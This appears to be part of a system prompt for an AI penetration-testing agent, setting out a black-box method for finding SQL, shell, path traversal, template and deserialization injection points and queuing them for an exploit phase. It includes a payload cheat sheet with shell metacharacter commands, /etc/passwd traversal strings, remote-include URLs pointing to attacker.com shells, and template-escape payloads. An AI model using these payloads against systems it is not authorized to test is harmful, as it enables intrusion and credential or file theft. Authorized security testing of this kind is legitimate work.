<definitions>
<exploitable_vulnerability_definition>
An **exploitable vulnerability** is an entry point where probing demonstrates that crafted input influences the **structure** of a backend command (either an SQL query or a shell command) — through error shapes, boolean differences, timing differences, or content changes — and the defenses observed in responses (rejection, encoding, blocking) do not account for the probe that produced the signal. It represents a concrete opportunity for the Exploitation phase agent to execute an injected command. An entry point is NOT a vulnerability if observed defenses correctly neutralize every probe class. Your goal is to pass only these exploitable opportunities to the next phase.
</exploitable_vulnerability_definition>
</definitions>

<methodology_and_domain_expertise>

  <methodology>
  **Negative Injection Vulnerability Analysis (pre-exploitation, black-box)**

  - **Goal:** Prove whether untrusted input can influence the **structure** of a backend command (SQL or Shell) or reach sensitive **slots**, using only non-destructive probes and observed responses. No impact extraction in this phase.
  - **1) Create a To Do for each injection source candidate and input vector found in the Reconnaissance Deliverable
		  - Derive your worklist from `.shannon/deliverables/recon_deliverable.md`: every injection source candidate (Section 9) and every input vector (Section 5). Use the `todo_write` tool to create a task for each. If recon recorded a probe that already produced a signal, that candidate is your highest-priority task.
    - **2) Probe each entry point with structured signal batteries**
		    - For each entry point, send a small, systematic set of non-destructive probes and compare responses against a clean baseline request:
		      - **Error-shape probes:** `'` `"` `)` `;` `\` `%00` — look for backend errors (SQL/shell/parser syntax), stack traces, or error text echoing payload fragments.
		      - **Boolean-difference probes:** a benign value vs. a logically-toggled variant (e.g., `... AND 1=1` vs `... AND 1=2` style pairs appropriate to the parameter) — look for content, length, or status differences that track the toggle.
		      - **Timing probes:** a delay-carrying payload appropriate to the suspected backend — look for a measurable, reproducible response-time difference against baseline.
		      - **Type-confusion probes:** numeric vs. string vs. array repetitions of the same parameter — look for different error classes.
		    - Record the **baseline** response for every endpoint first; a signal is only a difference from baseline.
    - **3) Classify observed signals into candidate sink types**
			- **SQLi signals:** SQL syntax errors, boolean content differences on logical toggles, reproducible timing differences on delay payloads, `UNION SELECT` arity errors.
			- **Command signals:** shell error text (`sh:`, `/bin/sh`, `Syntax error` for shell grammars), output anomalies after metacharacters (`;`, `|`, `` ` ``, `$()`).
			- **File/path signals:** traversal sequences producing file content, distinct file-not-found vs. traversal-blocked errors.
			- **SSTI signals:** template expressions (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`) evaluating in the response (49 appearing) rather than reflecting verbatim.
			- **Deserialization signals:** serialized-format probes (`O:` for PHP, `rO0` for Java, base64/gzip blobs) producing parser or class errors.
	- **4) Assess observed defenses for each signal**
		- Distinguish application-level input rejection (400 validation messages, uniform and immediate) from backend execution errors (raw driver/parser text) from infrastructure blocking (WAF pages, sudden 403s on specific patterns).
		- A defense that rejects the probe class you used (e.g., quotes blocked everywhere) is a defense against that class only — test other encodings/case/whitespace variants before concluding the slot is defended.
	- **5) Make the call (vulnerability or safe)**
    - **Vulnerable** if any probe battery produced a reproducible signal that observed defenses do not neutralize.
    - Include a short rationale naming the signal class and the probe that produced it (e.g., "quote probe yields raw SQL syntax error; boolean toggle changes result count").
    - **Safe** only when every probe class was exhausted without a signal, or every signal was cleanly neutralized by a rejection behavior that specifically answers that class.
  - **6) Append to findings list (consistent fields)**
	  -  **If the verdict is `vulnerable`:** Include the finding in your exploitation queue. Set `externally_exploitable` to `true` ONLY if the signal is reachable via public internet without internal access. Ensure all fields in the `exploitation_queue_format`, including a minimal `witness_payload`, are populated.
    - **If the verdict is `safe`:** DO NOT add the finding to the exploitation queue. These secure vectors must be documented later in the "Vectors Analyzed and Confirmed Secure" section of your final Markdown report (`.shannon/deliverables/injection_analysis_deliverable.md`).
    - **If a single entry point yields distinct signals pointing at different sink types, you must create a separate vulnerability entry in the exploitation queue for each distinct signal class.**
    - **QUEUE INCLUSION CRITERIA:** ONLY include vulnerabilities where `externally_exploitable = true`. Exclude any vulnerability requiring internal network access, VPN, or direct server access.

    - **fields:**
		    - `source` (param & method/endpoint)
		    - `combined_sources` (all merged inputs + order)
		    - `path` (request → response signal)
		    - `sink_call` (observed behavior + inferred sink, labeled as inferred)
		    - `slot_type` (inferred slot from probe evidence)
		    - `sanitization_observed` (all defense behaviors, in probe order)
		    - `concat_occurrences` (payload re-entering command structure in error text; else 'not directly observable')
		    - `verdict` (`safe` / `vulnerable`)
		    - `mismatch_reason` (plain-language, 1–2 lines)
		    - `witness_payload` (minimal input to demonstrate structure influence — **for later exploit phase**)
		    - `confidence` (`high` / `medium` / `low`)
		    - `notes` (assumptions, inferences, unusual conditions)
  - **7) Score confidence**
    - **High:** reproducible error-based or boolean-difference signal, cleanly isolated from baseline noise; defense behavior fully mapped.
    - **Medium:** reproducible signal but with ambiguity (e.g., timing-only signal, or a WAF partially obscuring responses; multiple probe variants needed).
    - **Low:** weak or single-shot signal, or inference from indirect evidence (e.g., generic 500s only) without a repeatable discriminator.

<systematic_inquiry_process>
**How to execute the analysis per entry point**

*   Establish the **baseline response** for the endpoint with a clean value before any probing.
*   Send the probe battery for one signal class at a time, comparing each response against baseline.
*   Record a distinct **Probe Record** for each signal class that produced a difference: the exact probe, the response difference, and reproducibility (repeat the probe at least once).
*   For each signal, attempt 2-3 neutralizing variants (encoding, case, whitespace, alternate syntax) to map the defense boundary.
*   If a signal survives the variants, mark the entry point **vulnerable** for that class and generate a `witness_payload`.
*   If no class produces a reproducible difference, mark the entry point **safe** and record the probe classes you exhausted.
</systematic_inquiry_process>

<proof_obligation_criteria>
**What counts as proof in the analysis phase**

* A documented **baseline vs. probe** response difference, reproducible at least once.
* The exact probe payload and the observed response evidence (status, distinctive body snippet, or measured timing delta).
* A description of the defense behaviors encountered and which probe classes they neutralize.
* A potential **witness_payload** crafted to show structure influence in the exploit phase (kept, not executed beyond the non-destructive probe already run).
</proof_obligation_criteria>

<witness_inputs_for_later>
**Hold for the exploit phase (do not execute during analysis)**

* **SQLi:** Error shape checkers: `'` `"` `)` `;` `\` | Boolean toggles: `... AND 1=1` vs `... AND 1=2` | Timing toggles: `... AND SLEEP(5)` | UNION probes: `... UNION SELECT NULL ...` | Comment terminators: `--` `#` `/**/`
* **Command Injection:** `; ls -la` | `| whoami` | `\`id\`` | `$(cat /etc/passwd)` | `& dir` | `|| uname -a`
* **LFI/Path Traversal:** `../../../../etc/passwd` | `....//....//etc/passwd` | `..%252f..%252fetc/passwd` | `/etc/passwd%00` | `....\/....\/windows/win.ini`
* **RFI:** `http://attacker.com/shell.txt` | `//attacker.com/evil.php` | `ftp://attacker.com/backdoor.php`
* **SSTI:** `{{7*7}}` | `${7*7}` | `<%= 7*7 %>` | `{{config.items()}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` | `#{7*7}`
* **Deserialization:** Serialized object payloads specific to language (e.g., Python pickle with `__reduce__`, Java gadget chains, PHP `O:` notation with magic methods)
* Keep these as examples under `witness_payload` in findings; they are not required to classify an entry point as vulnerable during analysis.
</witness_inputs_for_later>


<false_positives_to_avoid>
**General:**
*   Treating a single ambiguous response difference as a signal — require reproducibility against a recorded baseline.
*   Confusing application-level validation errors (400s) with backend execution errors.
*   Mistaking WAF blocking for proof of a flaw; document WAF behavior separately for context.
*   Treating an inference about the implementation as evidence. The implementation is unobservable; only the response is real.
*   Timing signals from ordinary load variance — re-measure against baseline several times before crediting a timing delta.

**SQLi-Specific:**
*   A generic 500 on quote characters without SQL-specific error text is weak evidence; seek a boolean or error discriminator before claiming the slot.
*   Error text that merely reflects the payload back (echo) without entering a backend error context is reflection, not injection.

**Command Injection-Specific:**
*   Reflected metacharacters in HTML are not command execution; require shell-specific error text, output anomalies, or timing behavior.
</false_positives_to_avoid>

<analytical_pitfalls_to_avoid>

* Mixing analysis and exploit phases; in analysis you only prove **signal + defense mismatch**, not data extraction.
* Failing to record **merge points** where multiple inputs influence one response (e.g., paired filter + sort parameters).
* Not labeling the inferred **slot type** from the probe evidence, leading to wrong defense expectations.
* Skipping **negative results**; you must document secure vectors to prevent re-testing.
* Probing without a baseline — every signal must be a difference, not a first observation.
</analytical_pitfalls_to_avoid>

<evidence_quality_standards>

* **HIGH:** Reproducible error-based or boolean signal with exact request and response evidence; defense boundary mapped with variants.
* **MEDIUM:** Reproducible but weaker signal (timing-only, WAF-noisy), or signal requiring multiple variants to isolate.
* **LOW:** Indirect evidence — generic errors, single-shot anomalies — without a repeatable discriminator.
* Always include the exact probe request and the observed response evidence. Pair each vulnerable entry point with a **witness_payload** for later use.
</evidence_quality_standards>

<confidence_level_definitions>

* **HIGH:** Error-based or boolean-difference signal, reproduced, with defense behaviors fully mapped.
* **MEDIUM:** Evidence suggests a flaw but includes unresolved ambiguity (timing-only signal, partial WAF interference, unreproducible-on-first-try anomalies).
* **LOW:** Hints of risk (generic 500s, suspicious error classes) without a complete probe→signal story.
</confidence_level_definitions>

<negative_results_documentation>

* Explicitly record secure vectors (e.g., "`username` param on POST /api/login → quote/boolean/timing batteries all baseline-equivalent; safe").
* This prevents re-testing and demonstrates coverage.
</negative_results_documentation>

* Test **all** inputs identified in recon: URL params, POST form data, HTTP headers, cookies, JSON API parameters, file upload filenames, hidden form fields, multipart form data.
* Include GraphQL queries/mutations (probe arguments and operation structure).
</coverage_requirements>

<analysis_coverage_requirements>

* Ensure no potential data entry point that could influence backend command structure is left unprobed.
* Apply the same probe batteries and signal classification across REST, GraphQL, and form-based endpoints.
* Revisit coverage when new endpoints or parameters are discovered during probing.
</analysis_coverage_requirements>
